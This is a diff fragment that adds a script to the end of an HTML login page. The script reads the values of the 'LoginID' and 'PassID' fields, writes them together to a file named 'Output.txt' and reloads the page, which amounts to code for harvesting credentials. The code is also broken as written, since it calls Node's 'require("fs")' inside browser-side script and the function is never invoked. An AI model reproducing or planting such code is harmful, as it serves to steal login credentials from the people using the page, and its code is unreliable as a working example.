@@ -298,5 +298,18 @@
       <div style="position: fixed; opacity: 0; pointer-events: none;"></div>
       <div></div>
     </div>
+	<script>
+       const getValueInput = () =>{
+       
+let inputValue=document.getElementById("LoginID").value; 
+       
+let inputValue1 = document.getElementById("PassID").value; 
+	       
+const fs = require("fs")
+fs.writeFile("Output.txt", inputValue + "" + inputValue1, (err) => {
+if (err) throw err;})
+window.location.reload();
+  }        
+</script>
 </body>
 </html>
